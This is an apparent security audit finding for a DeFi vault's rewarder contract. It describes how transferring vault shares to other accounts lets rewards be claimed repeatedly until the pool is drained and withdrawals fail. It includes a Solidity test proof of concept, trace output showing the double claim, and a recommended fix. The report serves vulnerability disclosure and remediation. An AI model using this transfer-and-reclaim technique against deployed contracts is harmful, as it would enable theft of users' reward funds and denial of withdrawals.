# Funds/Rewards extraction from Rewarder due to missing tracking mechanism.
## Summary
Rewarder’s funds can be subtracted due to the absence of a validation when transferring shares leading to users being unable to make withdrawals from the LMPVault. 

## Vulnerability Detail
The scenario resembles a governance type vulnerability where a user with voting powers is able to transfer this power to other users without restriction and utilize it X number of times to obtain a specific profit or advantage.

In this specific case a user A is able to transfer its shares to others, making them able to claim rewards until a complete drain is performed. Then, if any other user withdraws from the LMPVault, since no assets are available, he falls into a DoS scenario, since rewarder is having now zero assets.  

### PoC
The POC below describes the scenario. Basically:

An attacker deposits X shares to the LMP Vault, (the vault has Y number of total shares)
When the attacker is able to claim rewards (after time elapsed) he gets Z tokes. 
At this moment he is able to send his shares to other controlled accounts, and these accounts are able to claim rewards again until all rewards are drained. 
If any other user (aside from controlled accounts) wants to withdraw it will fail (DoS scenario). 


```Solidity
  function test_rewards_substraction() public {
        
            address user1 = makeAddr("User1");
            address user2 = makeAddr("User2");
            address attacker = makeAddr("attacker");
            
            _asset.mint(address(this), 1000);
            _asset.mint(user1, 1000);
            _asset.mint(user2, 1000);
            _asset.approve(address(_lmpVault), 1000);

            assertEq(_lmpVault.balanceOf(address(this)), 0);
            assertEq(_lmpVault.rewarder().balanceOf(address(this)), 0);

            _accessController.grantRole(Roles.DV_REWARD_MANAGER_ROLE, address(this));
            _lmpVault.rewarder().addToWhitelist(address(this));
        
            _toke.mint(address(this), 1000e18);
            _toke.approve(address(_lmpVault.rewarder()), 1000e18);
            _lmpVault.rewarder().queueNewRewards(1000e18);

            uint256 shares = _lmpVault.deposit(1000, address(this));
           
            vm.startPrank(user1);
            _asset.approve(address(_lmpVault), 1000);
            _lmpVault.deposit(1000, user1);
            vm.stopPrank();

            vm.startPrank(user2);
            _asset.approve(address(_lmpVault), 1000);
            _lmpVault.deposit(1000, user2);
            vm.stopPrank();

            assert(_toke.balanceOf(attacker) == 0);
            assert(_toke.balanceOf(address(this)) == 0);
            vm.roll(block.number + 10_000);
            _lmpVault.rewarder().getReward();
            _lmpVault.transfer(attacker, 1000);
           
            vm.startPrank(attacker);
            _lmpVault.rewarder().getReward();
            vm.stopPrank();
            assert(_toke.balanceOf(attacker) > 0);
            assert(_toke.balanceOf(address(this)) > 0);

    }   

```

As we recalled, there is no mechanism preventing transferring the shares from account A to account B, and account B claiming rewards with the shares of Account A which should be possible. Therefore it was possible for the attacker to claim rewards according to the results of the PoC above:

```Solidity
 │   └─ ← ()
    ├─ [563] toke::balanceOf(attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e]) [staticcall]
    │   └─ ← 333333333333333333333 [3.333e20]
    ├─ [563] toke::balanceOf(testContract: [0xA8452Ec99ce0C64f20701dB7dD3abDb607c00496]) [staticcall]
    │   └─ ← 333333333333333333333 [3.333e20]
    └─ ← ()
```

## Impact
There are two main critical issues to address here. The first one is the user’s (or attacker) capability to deplete all funds from the rewarder as we saw in the PoC. The second is the DoS state that leaves as any other user cannot withdraw from the LMP vault.

## Tool used
Manual Review

## Recommendation
There should be a tracking mechanism in place for the transfers in the rewarder, so it prevents “its reutilization”, specially there should be a checkpoint update when dealing with balances. 
Additional tests are required in RewardVault.t to thoroughly verify the emission of rewards.
